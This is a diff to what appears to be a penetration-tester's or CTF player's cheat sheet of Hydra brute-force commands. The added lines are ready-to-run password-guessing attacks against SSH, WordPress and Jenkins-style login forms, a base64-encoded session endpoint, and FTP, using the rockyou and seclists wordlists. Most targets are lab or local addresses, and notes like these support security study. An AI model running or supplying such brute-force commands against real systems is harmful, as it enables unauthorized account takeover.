@@ -1,3 +1,12 @@
-hydra -l ajla -P /home/kali/rockyou.txt -T 20 sandbox.local ssh
-hydra -L usernames.txt -p 1234 -t 10 -V $ip http-post-form -I ‘/wp-login.php:log=^USER^&pwd=^PASS^wp-submit=Log+In:Invalid’
+hydra -l <username> -P /usr/share/wordlists/<wordlist> <ip> http-post-form
+hydra 127.0.0.1 -s 4444 -V -f http-form-post "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in&Login=Login:Invalid username or password" -l admin -P rockyou.txt
+
+
+hydra -I -f -L custom-wordlist.txt -P custom-wordlist.txt 'http-post-form://192.168.169.61:8081/service/rapture/session:username=^USER64^&password=^PASS64^:C=/:F=403'
+
+FTP bruteforce;
+hydra -C /usr/share/wordlists/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://192.168.242.183
+
+#Indigual user brute force
+hydra -l jose -P /usr/share/wordlists/rockyou.txt lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong" -V
 
